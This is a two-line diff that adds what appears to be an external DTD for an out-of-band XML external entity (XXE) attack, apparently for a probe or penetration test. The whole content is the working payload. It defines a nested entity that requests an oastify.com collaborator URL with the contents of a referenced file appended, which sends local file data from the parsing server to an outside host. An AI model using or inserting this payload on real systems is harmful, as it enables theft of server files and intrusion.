@@ -1,0 +1,2 @@
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://2adnotmnsjqxaez6aqht12s8wz2qqge5.oastify.com/xxe-probe-uat/?collect=%file;'>">
+%all;
